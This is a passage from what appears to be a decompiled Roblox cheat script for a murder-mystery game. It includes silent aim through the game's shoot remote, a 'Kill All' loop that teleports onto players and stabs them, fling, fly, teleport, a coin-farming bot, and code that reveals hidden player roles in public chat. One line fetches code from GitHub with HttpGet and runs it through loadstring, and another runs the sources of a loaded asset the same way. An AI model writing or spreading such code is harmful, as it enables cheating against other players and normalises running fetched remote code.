                u280 = Position + (u280 - Position).Unit * n11
            end
        end

        v281.prevPos = HumanoidRootPart.Position
        v281.prevTime = elapsed
    else
        local TargetTracking = _G.TargetTracking
        local Name = v273.Name
        local HumanoidRootPartPosition = HumanoidRootPart.Position
        local zero = Vector3.zero

        TargetTracking[Name] = {
			prevPos = HumanoidRootPartPosition,
			prevTime = elapsed,
			velocity = zero
		}
    end

    local v289 = v272:FindFirstChild("Shoot") or v272:FindFirstChild("Fire")

    if v289 then
        local cFrame = CFrame.lookAt(Position2, u280)

        pcall(function()
            v289:FireServer(cFrame, CFrame.new(u280))
        end)
        pcall(function()
            v289:FireServer(cFrame)
        end)
    else
        t3.value18("SilentAim", "Shoot remote not found", "Error", nil, 2)
    end
end
t3.value65 = t1.value18
t3.value38 = false
t3.value66 = nil
t3.value67 = t1.value16
t3.value68 = nil
function t1.value23()
    if t3.value37 then
        return
    end

    local ScreenGui2 = Instance.new("ScreenGui")

    ScreenGui2.Name = "SilentAimMobileBtn"
    ScreenGui2.Parent = t3.value11.PlayerGui
    ScreenGui2.ResetOnSpawn = false
    ScreenGui2.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    ScreenGui2.DisplayOrder = 100

    local TextButton = Instance.new("TextButton")

    TextButton.Name = "ShootButton"
    TextButton.Size = t3.value23 and UDim2.fromOffset(80, 80) or UDim2.fromOffset(100, 100)
    TextButton.Position = t3.value23 and UDim2.new(1, -100, 0.5, -40) or UDim2.new(1, -120, 0.5, -50)
    TextButton.BackgroundColor3 = Color3.fromRGB(220, 40, 40)
    TextButton.Text = "Silent\nAim"
    TextButton.Font = Enum.Font.SourceSansBold
    TextButton.TextColor3 = Color3.new(1, 1, 1)
    TextButton.TextSize = not t3.value23 and 18 or 14
    TextButton.TextWrapped = true
    TextButton.BorderSizePixel = 0
    TextButton.ZIndex = 10
    TextButton.Active = true
    TextButton.Visible = true
    Instance.new("UICorner", TextButton).CornerRadius = UDim.new(0.2, 0)
    TextButton.Parent = ScreenGui2
    TextButton.MouseButton1Click:Connect(function()
        t3.value65()
    end)
    t3.value37 = ScreenGui2
end
function t1.value24(p34)
    local v294 = t3.value54(p34)

    if v294 then
        task.spawn(function()
            t3.value68(v294)
        end)

        return
    end

    t3.value18("Error", "No " .. p34 .. " found", "Error", nil, 2)
end
t3.value68 = t1.value2
t3.value69 = t1.value24
function t1.value25()
    if t3.value36 then
        return
    end

    local ScreenGui3 = Instance.new("ScreenGui")

    ScreenGui3.Name = "MobileKnifeBtn"
    ScreenGui3.Parent = t3.value11.PlayerGui
    ScreenGui3.ResetOnSpawn = false
    ScreenGui3.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    ScreenGui3.DisplayOrder = 100

    local TextButton = Instance.new("TextButton")

    TextButton.Name = "KnifeButton"
    TextButton.Size = t3.value23 and UDim2.fromOffset(80, 80) or UDim2.fromOffset(100, 100)
    TextButton.Position = t3.value23 and UDim2.new(1, -100, 0.5, -110) or UDim2.new(1, -120, 0.5, -130)
    TextButton.BackgroundColor3 = Color3.fromRGB(220, 40, 40)
    TextButton.Text = "Knife\nAim"
    TextButton.Font = Enum.Font.SourceSansBold
    TextButton.TextColor3 = Color3.new(1, 1, 1)
    TextButton.TextSize = not t3.value23 and 18 or 14
    TextButton.TextWrapped = true
    TextButton.BorderSizePixel = 0
    TextButton.ZIndex = 10
    TextButton.Active = true
    TextButton.Visible = true
    Instance.new("UICorner", TextButton).CornerRadius = UDim.new(0.2, 0)
    TextButton.Parent = ScreenGui3
    TextButton.MouseButton1Click:Connect(function()
        t3.value63()
    end)
    t3.value36 = ScreenGui3
end
t3.value70 = nil
t3.value44 = false
t3.value71 = nil
function t1.value26(p35)
    t3.value44 = p35

    if p35 then
        if t3.value70 then
            coroutine.close(t3.value70)
            t3.value70 = nil
        end

        t3.value70 = coroutine.create(t3.value71)
        coroutine.resume(t3.value70)
        t3.value18("Extreme Fling", "ON", "Success", nil, 2)

        return
    end

    if t3.value70 then
        coroutine.close(t3.value70)
    end

    local Character = t3.value11.Character

    if Character then
        local HumanoidRootPart = Character:FindFirstChild("HumanoidRootPart")

        if HumanoidRootPart then
            HumanoidRootPart.Velocity = Vector3.zero
            HumanoidRootPart.RotVelocity = Vector3.zero
        end
    end

    t3.value18("Extreme Fling", "OFF", "Info", nil, 2)
end
t3.value71 = t1.value4
t3.value72 = t1.value26
function t1.value2(p36)
    if t3.value21 then
        pcall(function()
            t3.value21:Fire(p36)
        end)

        return
    end

    t3.value18("Error", "Emote remote not found", "Error", nil, 2)
end
t3.value73 = nil
t3.value47 = false
t3.value26 = nil
t3.value74 = t1.value12
t3.value75 = t1.value29
t3.value76 = false
t1.value14 = t3.value10
function t1.value2()
    if t3.value41 then
        t3.value41:Disconnect()
    end

    local SilentAimKey = _G.SilentAimKey

    if type(SilentAimKey) ~= "string" then
        SilentAimKey = "E"
        _G.SilentAimKey = "E"
    end

    if _G.SilentAimEnabled and SilentAimKey ~= "NONE" then
        local u302 = Enum.KeyCode[SilentAimKey]

        if not u302 then
            u302 = Enum.KeyCode.E
            _G.SilentAimKey = "E"
        end

        t3.value41 = t3.value10.InputBegan:Connect(function(input, gameProcessed)
            if gameProcessed then
                return
            end

            if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == u302 then
                t3.value65()
            end
        end)
    end
end
t1.value29 = t1.value14.InputBegan
function t1.value4(p37, p38)
    if p38 then
        return
    end

    if t3.value10:IsKeyDown(Enum.KeyCode.LeftControl) and (p37.UserInputType == Enum.UserInputType.MouseButton1 and t3.value76) then
        local Mouse = t3.value11:GetMouse()

        if not Mouse then
            return
        end

        local v306 = t3.value12:ScreenPointToRay(Mouse.X, Mouse.Y)
        local ray = Ray.new(v306.Origin, v306.Direction * 1000)
        local part, position = workspace:FindPartOnRay(ray, t3.value11.Character)

        if part and position then
            t3.value11.Character:MoveTo(position)
            t3.value18("Teleport", "Teleported to " .. tostring(position), "Info", nil, 2)
        end
    end
end
t1.value29:Connect(t1.value4)
t3.value77 = nil
t3.value78 = nil
function t1.value30(p39)
    _G.RoundTimer = p39

    if p39 then
        t3.value78 = Instance.new("TextLabel")
        t3.value78.Parent = t3.value14
        t3.value78.BackgroundTransparency = 1
        t3.value78.TextColor3 = Color3.fromRGB(255, 255, 255)
        t3.value78.TextScaled = true
        t3.value78.AnchorPoint = Vector2.new(0.5, 0.5)
        t3.value78.Position = UDim2.fromScale(0.5, 0.15)
        t3.value78.Size = UDim2.fromOffset(200, 50)
        t3.value78.Font = Enum.Font.GothamBold
        t3.value78.Text = "Round Timer: --"
        t3.value77 = task.spawn(function()
            while _G.RoundTimer do
                pcall(function()
                    local v889 = t3.value15:FindFirstChild("Remotes") and (t3.value15.Remotes:FindFirstChild("Extras") and t3.value15.Remotes.Extras:FindFirstChild("GetTimer"))

                    if v889 then
                        local v890 = v889:InvokeServer()

                        if v890 and v890 ~= -1 then
                            local v891 = math.floor(v890 / 60)
                            local v892 = v890 % 60

                            t3.value78.Text = string.format("Round Timer: %02d:%02d", v891, v892)

                            return
                        end

                        t3.value78.Text = "Round Timer: --"
                    end
                end)
                task.wait(0.5)
            end
        end)

        return
    end

    if t3.value78 then
        t3.value78:Destroy()
    end

    if t3.value77 then
        task.cancel(t3.value77)
    end
end
t3.value79 = nil
t3.value80 = nil
t3.value78 = nil
t3.value77 = nil
t3.value81 = t1.value30
function t1.value29(p40)
    _G.ImproveFPS = p40

    if p40 then
        if not t3.value79 then
            t3.value79 = true
            pcall(function()
                local Terrain = workspace:FindFirstChildOfClass("Terrain")

                if Terrain then
                    Terrain.WaterWaveSize = 0
                    Terrain.WaterWaveSpeed = 0
                    Terrain.WaterReflectance = 0
                    Terrain.WaterTransparency = 0
                end

                game.Lighting.GlobalShadows = false
                game.Lighting.FogEnd = 9000000000
                settings().Rendering.QualityLevel = 1

                for _, descendant in ipairs(workspace:GetDescendants()) do
                    local v784 = descendant:IsA("Part")

                    if not v784 then
                        v784 = descendant:IsA("UnionOperation") or (descendant:IsA("MeshPart") or (descendant:IsA("CornerWedgePart") or descendant:IsA("TrussPart")))
                    end

                    if v784 then
                        descendant.Material = Enum.Material.Plastic
                        descendant.Reflectance = 0
                    elseif descendant:IsA("Decal") then
                        descendant.Transparency = 1
                    elseif descendant:IsA("ParticleEmitter") or descendant:IsA("Trail") then
                        descendant.Lifetime = NumberRange.new(0)
                    elseif descendant:IsA("Explosion") then
                        descendant.BlastPressure = 1
                        descendant.BlastRadius = 1
                    end
                end

                for _, descendant in ipairs(game.Lighting:GetDescendants()) do
                    local v787 = descendant:IsA("BlurEffect")

                    if not v787 then
                        v787 = descendant:IsA("SunRaysEffect")

                        if not v787 then
                            v787 = descendant:IsA("ColorCorrectionEffect") or (descendant:IsA("BloomEffect") or descendant:IsA("DepthOfFieldEffect"))
                        end
                    end

                    if v787 then
                        descendant.Enabled = false
                    end
                end

                if t3.value80 then
                    t3.value80:Disconnect()
                end

                t3.value80 = workspace.DescendantAdded:Connect(function(descendant)
                    local v894 = descendant:IsA("ForceField")

                    if not v894 then
                        v894 = descendant:IsA("Sparkles") or (descendant:IsA("Smoke") or descendant:IsA("Fire"))
                    end

                    if v894 then
                        task.wait(0.1)
                        descendant:Destroy()
                    end
                end)
            end)
            t3.value18("FPS Boost", "Enabled", "Success", nil, 3)

            return
        end
    else
        t3.value79 = false

        if t3.value80 then
            t3.value80:Disconnect()
            t3.value80 = nil
        end

        t3.value18("FPS Boost", "Disabled", "Info", nil, 2)
    end
end
t3.value79 = false
t3.value80 = nil
t3.value82 = t1.value29
function t1.value4(p41)
    _G.HeadlessEnabled = p41

    if p41 then
        if t3.value66 then
            t3.value66:Disconnect()
        end

        t3.value66 = t3.value9.Heartbeat:Connect(function()
            local Character = t3.value11.Character

            if Character then
                local Head = Character:FindFirstChild("Head")

                if Head then
                    Head.MeshId = "http://www.roblox.com/asset/?id=6686307858"
                    Head.TextureID = "http://www.roblox.com/asset/?id=6686307858"
                    Head.Transparency = 1
                end
            end
        end)

        return
    end

    if t3.value66 then
        t3.value66:Disconnect()
        t3.value66 = nil
    end
end
function t1.value29(p42)
    _G.RTXShaders = p42

    local Lighting = game:GetService("Lighting")

    if p42 then
        local BloomEffect = Instance.new("BloomEffect", Lighting)

        BloomEffect.Name = "RTX_Bloom"
        BloomEffect.Intensity = 0.1
        BloomEffect.Size = 100

        local ColorCorrectionEffect = Instance.new("ColorCorrectionEffect", Lighting)

        ColorCorrectionEffect.Name = "RTX_CC"
        ColorCorrectionEffect.Saturation = 0.05
        ColorCorrectionEffect.TintColor = Color3.fromRGB(255, 224, 219)

        local SunRaysEffect = Instance.new("SunRaysEffect", Lighting)

        SunRaysEffect.Name = "RTX_SunRays"
        SunRaysEffect.Intensity = 0.05
        Lighting.Brightness = 2.14
        Lighting.ColorShift_Bottom = Color3.fromRGB(11, 0, 20)
        Lighting.ColorShift_Top = Color3.fromRGB(240, 127, 14)
        Lighting.OutdoorAmbient = Color3.fromRGB(34, 0, 49)
        Lighting.ClockTime = 6.7
        t3.value18("RTX Shaders", "Enabled", "Success", nil, 3)

        return
    end

    local GetChildren = Lighting.GetChildren

    for _, v in ipairs(GetChildren(Lighting)) do
        if v.Name:find("RTX") then
            v:Destroy()
        end
    end

    Lighting.Brightness = 2
    Lighting.ColorShift_Bottom = Color3.new(0, 0, 0)
    Lighting.ColorShift_Top = Color3.new(0, 0, 0)
    Lighting.OutdoorAmbient = Color3.fromRGB(157, 157, 157)
    Lighting.ClockTime = 14
end
t3.value40 = nil
t3.value83 = t1.value33
t3.value66 = nil
t3.value84 = t1.value4
t3.value37 = nil
function t1.value4()
    local Backpack = t3.value11:WaitForChild("Backpack", 5)

    if not Backpack then
        t3.value18("Error", "No backpack", "Error", nil, 2)

        return
    end

    if Backpack:FindFirstChild("Boombox") then
        t3.value18("Error", "Already have", "Error", nil, 2)

        return
    end

    local v322 = game:GetObjects("rbxassetid://740618400")[1]

    if not v322 then
        t3.value18("Error", "Failed to load", "Error", nil, 2)

        return
    end

    v322.Parent = Backpack
    pcall(function()
        loadstring(v322.Client.Source)()
        loadstring(v322.Server.Source)()
    end)
    t3.value18("Boombox", "Added to backpack", "Success", nil, 3)
end
t3.value85 = t1.value23
t3.value86 = t1.value34
t3.value36 = nil
function t1.value37(p43)
    _G.FlyEnabled = p43

    local Character = t3.value11.Character
    local v325 = Character and Character:FindFirstChild("HumanoidRootPart")

    if not v325 then
        return
    end

    if p43 then
        local BodyVelocity = Instance.new("BodyVelocity")

        BodyVelocity.Velocity = Vector3.zero
        BodyVelocity.MaxForce = Vector3.new(9000000000, 9000000000, 9000000000)
        BodyVelocity.Parent = v325

        local BodyGyro = Instance.new("BodyGyro")

        BodyGyro.MaxTorque = Vector3.new(9000000000, 9000000000, 9000000000)
        BodyGyro.CFrame = t3.value12.CFrame
        BodyGyro.Parent = v325
        t3.value73 = t3.value9.RenderStepped:Connect(function()
            if not _G.FlyEnabled then
                return
            end

            local value12 = t3.value12

            BodyGyro.CFrame = value12.CFrame

            local zero = Vector3.zero

            if t3.value10:IsKeyDown(Enum.KeyCode.W) then
                zero += value12.CFrame.LookVector
            end

            if t3.value10:IsKeyDown(Enum.KeyCode.S) then
                zero -= value12.CFrame.LookVector
            end

            if t3.value10:IsKeyDown(Enum.KeyCode.A) then
                zero -= value12.CFrame.RightVector
            end

            if t3.value10:IsKeyDown(Enum.KeyCode.D) then
                zero += value12.CFrame.RightVector
            end

            if t3.value10:IsKeyDown(Enum.KeyCode.Space) then
                zero += Vector3.new(0, 1, 0)
            end

            if t3.value10:IsKeyDown(Enum.KeyCode.LeftControl) then
                zero -= Vector3.new(0, 1, 0)
            end

            BodyVelocity.Velocity = zero * _G.FlySpeed
        end)

        return
    end

    if t3.value73 then
        t3.value73:Disconnect()
    end

    if v325:FindFirstChild("BodyVelocity") then
        v325.BodyVelocity:Destroy()
    end

    if v325:FindFirstChild("BodyGyro") then
        v325.BodyGyro:Destroy()
    end
end
t3.value87 = t1.value25
t3.value88 = t1.value3
t3.value41 = nil
t3.value89 = t1.value2
t3.value90 = t1.value35
function t1.value2()
    if t3.value32 then
        t3.value32 = false
        t3.value18("Kill All", "Stopped", "Info", nil, 2)

        return
    end

    local Character = t3.value11.Character
    local v329 = Character

    if v329 then
        v329 = Character:FindFirstChild("Knife") or t3.value11.Backpack and t3.value11.Backpack:FindFirstChild("Knife")
    end

    local u330 = v329

    if not u330 then
        t3.value18("Error", "No knife", "Error", nil, 2)

        return
    end

    t3.value32 = true
    t3.value18("Kill All", "Running", "Info", nil, 3)
    task.spawn(function()
        local g800
        while t3.value32 do
            local v792 = false

            for _, player in ipairs(t3.value8:GetPlayers()) do
                if not (player ~= t3.value11 and (player.Character and not t3.value52(player))) then
                    continue
                end

                local Humanoid = player.Character:FindFirstChildOfClass("Humanoid")
                local HumanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")

                if Humanoid and (Humanoid.Health > 0 and HumanoidRootPart) then
                    v792 = true

                    local HumanoidRootPart3 = Character:FindFirstChild("HumanoidRootPart")
                    local Humanoid2 = Character:FindFirstChildOfClass("Humanoid")

                    if not HumanoidRootPart3 or (not Humanoid2 or Humanoid2.Health <= 0) then
                        t3.value32 = false

                        break
                    end

                    u330 = Character:FindFirstChild("Knife") or t3.value11.Backpack and t3.value11.Backpack:FindFirstChild("Knife")

                    if u330 and u330.Parent ~= Character then
                        Humanoid2:EquipTool(u330)
                        task.wait(0.1)
                    end

                    local timestamp = tick()

                    if not (Humanoid.Health <= 0) then
                        if not (tick() - timestamp > 3) then
                        end
                    end

                    while true do
                        if not t3.value32 or (not HumanoidRootPart.Parent or Humanoid.Health <= 0) then
                            g800 = true
                        end

                        if g800 then
                            break
                        end

                        HumanoidRootPart3.CFrame = HumanoidRootPart.CFrame * CFrame.new(0, 0, 1.5)

                        if u330 and u330.Parent == Character then
                            u330:Activate()
                        end

                        task.wait()

                        if Humanoid.Health <= 0 or tick() - timestamp > 3 then
                            g800 = true
                        end

                        if g800 then
                            break
                        end
                    end
                end

                g800 = false
            end

            if not v792 then
                t3.value32 = false
                t3.value18("Kill All", "Done", "Success", nil, 3)

                return
            end

            task.wait(0.1)
        end
    end)
end
t3.value91 = t1.value6
t3.value73 = nil
t3.value92 = t1.value37
t3.value35 = nil
t3.value93 = t1.value36
t3.value45 = nil
t3.value94 = t1.value38
function t3.value95(p44)
    _G.EasyGlitch = p44

    if not p44 then
        return
    end

    local function v113()
        local Character = t3.value11.Character

        if not Character or not Character:FindFirstChild("HumanoidRootPart") then
            return false
        end

        local HumanoidRootPart = Character.HumanoidRootPart
        local v723 = HumanoidRootPart.CFrame.LookVector * Vector3.new(1, 0, 1)

        return workspace:Raycast(HumanoidRootPart.Position, v723.Unit * 0.4) ~= nil
    end
    local function v114()
        local Character = t3.value11.Character

        if not Character or not Character:FindFirstChild("HumanoidRootPart") then
            return
        end

        local HumanoidRootPart = Character.HumanoidRootPart
        local s1 = "Position"
        local v727 = HumanoidRootPart.CFrame.LookVector * Vector3.new(1, 0, 1).Unit * 1.2

        HumanoidRootPart[s1] = HumanoidRootPart[s1] + v727
    end
    local function v115(p45)
        local GetChildren = p45.GetChildren

        for _, v in ipairs(GetChildren(p45)) do
            local v735 = v

            if v735:IsA("Tool") then
                v735.Equipped:Connect(function()
                    local v880 = v735

                    if not _G.EasyGlitch then
                        return
                    end

                    local timestamp = tick()
                    local v882 = false

                    if v880 == nil then
                        v882 = timestamp - 0 < 1
                    end

                    if v882 and v113() then
                        v114()
                    end
                end)
            end
        end

        local Backpack = t3.value11:WaitForChild("Backpack")

        for _, child in ipairs(Backpack:GetChildren()) do
            local v739 = child

            if v739:IsA("Tool") then
                v739.Equipped:Connect(function()
                    local v883 = v739

                    if not _G.EasyGlitch then
                        return
                    end

                    local timestamp = tick()
                    local v885 = false

                    if v883 == nil then
                        v885 = timestamp - 0 < 1
                    end

                    if v885 and v113() then
                        v114()
                    end
                end)
            end
        end

        Backpack.ChildAdded:Connect(function(child)
            if child:IsA("Tool") then
                child.Equipped:Connect(function()
                    local v902 = child

                    if not _G.EasyGlitch then
                        return
                    end

                    local timestamp = tick()
                    local v904 = false

                    if v902 == nil then
                        v904 = timestamp - 0 < 1
                    end

                    if v904 and v113() then
                        v114()
                    end
                end)
            end
        end)
        p45.ChildAdded:Connect(function(child)
            if child:IsA("Tool") then
                child.Equipped:Connect(function()
                    local v905 = child

                    if not _G.EasyGlitch then
                        return
                    end

                    local timestamp = tick()
                    local v907 = false

                    if v905 == nil then
                        v907 = timestamp - 0 < 1
                    end

                    if v907 and v113() then
                        v114()
                    end
                end)
            end
        end)
    end

    if t3.value11.Character then
        v115(t3.value11.Character)
    end

    t3.value11.CharacterAdded:Connect(v115)
end
t1.value33 = _G
t1.value6 = "CoinFarmEnabled"
t1.value33[t1.value6] = false
t1.value33 = _G
t1.value6 = "CoinFarmSpeed"
t1.value33[t1.value6] = 25
t1.value33 = _G
t1.value6 = "CoinFarmRadius"
t1.value33[t1.value6] = 200
t1.value33 = _G
t1.value6 = "_coinFarmThread"
t1.value33[t1.value6] = nil
t1.value33 = _G
t1.value6 = "_collectedCoins"
t1.value33[t1.value6] = 0
t1.value33 = _G
t1.value6 = "_farmStartTime"
t1.value33[t1.value6] = 0
t1.value33 = _G
t1.value6 = "_currentRoundFarm"
t1.value33[t1.value6] = 0
t1.value33 = _G
t1.value6 = "_roundStartTimeFarm"
t1.value33[t1.value6] = 0
t1.value33 = _G
t1.value6 = "_OctreeModule"
t1.value34 = _G._OctreeModule or loadstring(game:HttpGet("https://raw.githubusercontent.com/Sleitnick/rbxts-octo-tree/main/src/init.lua", true))()
t1.value33[t1.value6] = t1.value34
function t1.value25()
    _G.CoinFarmEnabled = false

    if _G._coinFarmThread then
        task.cancel(_G._coinFarmThread)
        _G._coinFarmThread = nil
    end

    t3.value18("Coin Farm", "Stopped", "Info", nil, 2)
end
t1.value33 = _G._OctreeModule
t3.value96 = t1.value33
t1.value33 = _G.CoinFarmEnabled
function t1.value10()
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local ok5, result = pcall(function()
        return ReplicatedStorage:FindFirstChild("GetPlayerData", true):InvokeServer()
    end)

    if ok5 and result then
        for k, v in pairs(result) do
            if v.Role == "Murderer" then
                return game:GetService("Players"):FindFirstChild(k)
            end
        end
    end

    return nil
end
function t1.value29()
    while _G.CoinFarmEnabled do
        local Character = t3.value11.Character

        if Character and t3.value11:GetAttribute("Alive") then
            local HumanoidRootPart = Character:FindFirstChild("HumanoidRootPart")
            local Humanoid = Character:FindFirstChildOfClass("Humanoid")

            if HumanoidRootPart and Humanoid then
                return Character, HumanoidRootPart, Humanoid
            end
        end

        task.wait(0.5)
    end

    return nil, nil, nil
end
function t1.value38()
    for _, child in ipairs(workspace:GetChildren()) do
        if child:GetAttribute("MapID") and child:FindFirstChild("CoinContainer") then
            return child
        end
    end

    return nil
end
t3.value97 = t1.value38
t3.value98 = t1.value10
function t1.value23(p46, p47, p48, _)
    if not p46 or not p47 then
        return
    end

    local Position = p46:GetPivot().Position
    local timestamp = tick()

    while _G.CoinFarmEnabled do
        local v353 = math.min((tick() - timestamp) / p48, 1)
        local v354 = Position:Lerp(p47, v353)

        p46:PivotTo(CFrame.new(v354))

        if v353 >= 1 then
            task.wait(0.2)

            return
        end

        task.wait()
    end
end
local function v33(p50, p51)
    if not p50 then
        return nil
    end
    local v357 = t3.value97()
    if not v357 or not v357:FindFirstChild("CoinContainer") then
        return nil
    end
    local v358 = t3.value96.new()
    for v361, v362 in ipairs(v357.CoinContainer:GetChildren()) do

        local CoinVisual = v362:FindFirstChild("CoinVisual")

        if CoinVisual and not CoinVisual:GetAttribute("Collected") then
            v358:CreateNode(v362.Position, v362)
        end
    end
    local Nearest = v358:GetNearest(p50, p51, 10)
    if not Nearest or #Nearest == 0 then
        return nil
    end
    local v365 = t3.value98()
    local HumanoidRootPartPosition
    if v365 and v365.Character then
        local HumanoidRootPart = v365.Character:FindFirstChild("HumanoidRootPart")

        if HumanoidRootPart then
            HumanoidRootPartPosition = HumanoidRootPart.Position
        end
    end
    if not HumanoidRootPartPosition then
        return Nearest[1] and Nearest[1].Object or nil
    end
    local v368
    local v369, v370, v371 = ipairs(Nearest)
    local n12 = -1
    while true do
        local v373

        v371, v373 = v369(v370, v371)

        if not v371 then
            break
        end

        local v374 = v373 and v373.Object

        if v374 and v374.Position then
            local Magnitude = (v374.Position - HumanoidRootPartPosition).Magnitude

            if n12 < Magnitude then
                n12 = Magnitude
                v368 = v374
            end
        end
    end

    return v368 or (Nearest[1] and Nearest[1].Object or nil)
end
t3.value99 = t1.value23
t3.value100 = t1.value29
function t1.value29()
    if _G._coinFarmThread then
        return
    end

    _G.CoinFarmEnabled = true
    _G._collectedCoins = 0
    _G._farmStartTime = tick()
    _G._roundStartTimeFarm = tick()
    _G._currentRoundFarm = 0
    game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Gameplay"):WaitForChild("RoundStart").OnClientEvent:Connect(function()
        if _G.CoinFarmEnabled then
            _G._currentRoundFarm = _G._currentRoundFarm + 1
            _G._roundStartTimeFarm = tick()
            t3.value18("Coin Farm", "Round " .. _G._currentRoundFarm .. " started", "Info", nil, 3)
        end
    end)
    _G._coinFarmThread = task.spawn(function()
        repeat
            local g801 = false

            while _G.CoinFarmEnabled do
                local v802, _, _ = t3.value100()
                local v805 = v802

                if not v805 then
                    break
                end

                local v806 = t3.value97()

                while _G.CoinFarmEnabled and not v806 do
                    task.wait(1)
                    v806 = t3.value97()
                end

                if not _G.CoinFarmEnabled then
                    break
                end

                repeat
                    if not _G.CoinFarmEnabled or not (v805 and (v805.Parent and t3.value11:GetAttribute("Alive"))) or not v805:FindFirstChildOfClass("Humanoid") then
                        g801 = true
                    end

                    if g801 then
                        break
                    end

                    local Position = v805:GetPivot().Position
                    local v808 = v33(Position, _G.CoinFarmRadius)

                    if v808 then
                        local Position3 = v808.Position
                        local Magnitude = (Position - Position3).Magnitude
                        local v811 = math.max(0.5, Magnitude / _G.CoinFarmSpeed)
                        local u812 = v811
                        pcall(function()
                            t3.value99(v805, Position3, u812, _G.CoinFarmSpeed)
                        end)
                        local CoinVisual = v808:FindFirstChild("CoinVisual")
                        local n13 = 0
                        while true do
                            local CoinFarmEnabled = _G.CoinFarmEnabled

                            if CoinFarmEnabled then
                                CoinFarmEnabled = CoinVisual and (not CoinVisual:GetAttribute("Collected") and (CoinVisual.Parent and n13 < 10))
                            end

                            if not CoinFarmEnabled or not t3.value11:GetAttribute("Alive") then
                                break
                            end

                            local v816 = v33(v805:GetPivot().Position, _G.CoinFarmRadius)

                            if v816 and v816 ~= v808 then
                                break
                            end

                            task.wait(0.1)
                            n13 += 0.1
                        end
                        _G._collectedCoins = _G._collectedCoins + 1
                        t3.value18("Coin Farm", "Collected " .. _G._collectedCoins .. " coins", "Info", nil, 2)
                    else
                        task.wait(2)
                    end
                until not v808 and tick() - _G._roundStartTimeFarm > 30

                if g801 then
                    break
                end

                t3.value18("Coin Farm", "No coins for 30s, respawning...", "Warning", nil, 3)

                if t3.value11.Character and t3.value11.Character:FindFirstChild("Humanoid") then
                    t3.value11.Character.Humanoid.Health = 0
                end

                task.wait(3)
            end
        until not g801

        _G._coinFarmThread = nil
    end)
    t3.value18("Coin Farm", "Started (Speed: " .. _G.CoinFarmSpeed .. ")", "Success", nil, 3)
end
function t1.value38()
    local v376 = t3.value54("Murderer")
    local v377 = t3.value54("Sheriff")
    local v378 = "Murderer: " .. (v376 and v376.Name or "None" .. (" | Sheriff: " .. v377 and v377.Name or "None"))
    local TextChannels = game:GetService("TextChatService"):FindFirstChild("TextChannels")

    if TextChannels then
        for _, child in ipairs(TextChannels:GetChildren()) do
            local v382 = child

            if v382:IsA("TextChannel") and v382.Name ~= "RBXSystem" then
                pcall(function()
                    v382:SendAsync(v378)
                end)
            end
        end

        return
    end

    t3.value18("Error", "No chat channels", "Error", nil, 2)
end
t3.value101 = t1.value29
function t1.value34()
    local Character = t3.value11.Character
    if not Character or not Character:FindFirstChild("HumanoidRootPart") then
        return
    end
    local HumanoidRootPart = Character.HumanoidRootPart
    local t35 = {}
    for v388, v389 in ipairs(workspace:GetDescendants()) do

        if (v389.Name == "Spawn" or v389.Name == "PlayerSpawn") and v389:IsA("BasePart") then
            table.insert(t35, v389)
        end
    end
    if #t35 > 0 then
        HumanoidRootPart.CFrame = t35[1].CFrame * CFrame.new(0, 2.5, 0)

        return
    end
    t3.value18("Teleport", "No spawn found", "Error", nil, 2)
end
t3.value102 = t1.value25
function t1.value25(p52)
    if p52 then
        t3.value101()
    else
        t3.value102()
    end

    v32()
end
function t1.value6()
    local v391 = t3.value11.Character and t3.value11.Character:FindFirstChildOfClass("Humanoid")

    if v391 then
        v391.Health = 0
    end
end
function t1.value33()
    game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, t3.value11)
end
toggleCoinFarm = t1.value25
t3.value103 = 50
t3.value104 = 20
t3.value105 = 16
t3.value106 = false
t3.value107 = false
t3.value108 = false
t3.value109 = nil
function t1.value13()
    t3.value107 = true
    task.spawn(function()
        while t3.value107 do
            t3.value9.Heartbeat:Wait()

            local Character = t3.value11.Character
            local v818 = Character and Character:FindFirstChild("HumanoidRootPart")

            if v818 then
                local Velocity = v818.Velocity

                v818.Velocity = Velocity * t3.value103 + Vector3.new(0, 0, t3.value103)
                t3.value9.RenderStepped:Wait()

                if v818 then
                    v818.Velocity = Velocity
                end

                t3.value9.Stepped:Wait()

                if v818 then
                    v818.Velocity = Velocity + Vector3.new(0, 0.1, 0)
                end
            end
        end
    end)
end
t3.value110 = nil
t3.value111 = nil
function t1.value15()
end
t3.value112 = "rbxassetid://133566007754001"
t3.value113 = "rbxassetid://70636286183373"
t3.value114 = false
t3.value115 = false
function t1.value23()
    if not t3.value115 then
        t3.value18("Run", "Enable in menu first!", "Warning", nil, 2)

        return
    end

    local Character = t3.value11.Character

    if not Character then
        return
    end

    local Humanoid = Character:FindFirstChildOfClass("Humanoid")

    if not Humanoid then
        return
    end

    if t3.value108 then
        t3.value108 = false
        Humanoid.WalkSpeed = t3.value105

        if t3.value111 then
            t3.value111:Disconnect()
        end

        if t3.value110 then
            t3.value110:Stop()
            t3.value110 = nil
        end

        t3.value18("Run", "Disabled", "Info", nil, 1)
    else
        t3.value108 = true
        Humanoid.WalkSpeed = math.max(0.5, t3.value105 * (t3.value104 / 100))

        local Animation = Instance.new("Animation")

        Animation.AnimationId = t3.value113
        t3.value110 = Humanoid:LoadAnimation(Animation)
        t3.value110.Priority = Enum.AnimationPriority.Action
        t3.value110.Looped = true
        t3.value111 = t3.value9.RenderStepped:Connect(function()
            local Humanoid3 = Character:FindFirstChildOfClass("Humanoid")

            if not Humanoid3 or not t3.value110 then
                return
            end

            local v821 = t3.value109 and t3.value109.IsPlaying
            local v822 = false

            if Humanoid3.MoveDirection.Magnitude > 0 then
                v822 = false

                if Humanoid3.FloorMaterial ~= Enum.Material.Air then
                    v822 = not v821
                end
            end

            if v822 then
                if not t3.value110.IsPlaying then
                    t3.value110:Play()
                end

                t3.value110:AdjustSpeed(1)

                return
            end

            if t3.value110.IsPlaying then
                t3.value110:Stop()
            end
        end)
        t3.value18("Run", "Enabled (Speed: " .. t3.value104 .. "%)", "Success", nil, 2)
    end

    refreshMobileButtons()
end
t3.value116 = nil
function t1.value29()
    return (t3.value11.Character or t3.value11.CharacterAdded:Wait()):WaitForChild("Humanoid", 5)
end
t3.value117 = nil
function t1.value12()
    local v395 = t3.value117()

    if not v395 then
        return
    end

    local Animation = Instance.new("Animation")

    Animation.AnimationId = t3.value112
